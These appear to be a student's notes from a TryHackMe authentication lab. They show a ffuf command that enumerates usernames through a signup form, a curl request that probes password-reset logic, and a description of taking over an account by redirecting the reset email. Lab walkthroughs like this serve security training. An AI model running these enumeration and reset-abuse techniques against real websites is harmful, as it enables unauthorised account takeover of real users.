ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" 
-H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.33.252/customers/signup -mr "username already exists"
#In this example, we used the create user screen to enumerate through already created usernames with -mr "username already exists"
#We used a wordlist and in this example were able to find a few usernames for later use. ffuf must be looked into more. It has shown up in many tutorials

Using "curl" 
It is sometimes possible to skip steps in password reset logic statements on a website to allow for the changing of passwords.
(curl 'http://10.10.33.252/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert')
we can get the php logic statements returned for analysis.
In the Tryhackme tutorial, the attacker creates a support email account. This account gets the password reset email instead of the intended email address.
With the email sent to ourselves, we are able to reset the password and access the site.
